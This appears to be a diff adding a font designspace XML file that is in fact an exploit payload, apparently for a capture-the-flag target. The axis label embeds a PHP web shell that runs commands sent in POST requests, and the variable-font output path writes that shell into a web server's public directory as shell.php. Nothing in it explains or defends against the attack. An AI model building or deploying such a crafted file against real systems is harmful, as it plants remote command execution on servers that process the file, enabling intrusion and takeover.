@@ -1,0 +1,22 @@
+<designspace format="5.0">
+<axes>
+<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
+<labelname xml:lang="en"><![CDATA[<?php eval($_POST["cmd"]); ?>]]></labelname>
+</axis>
+</axes>
+
+<sources>
+<source filename="source-light.ttf" name="Light">
+<location><dimension name="Weight" xvalue="100"/></location>
+</source>
+<source filename="source-regular.ttf" name="Regular">
+<location><dimension name="Weight" xvalue="400"/></location>
+</source>
+</sources>
+
+<variable-fonts>
+<variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
+<axis-subsets><axis-subset name="Weight"/></axis-subsets>
+</variable-font>
+</variable-fonts>
+</designspace>
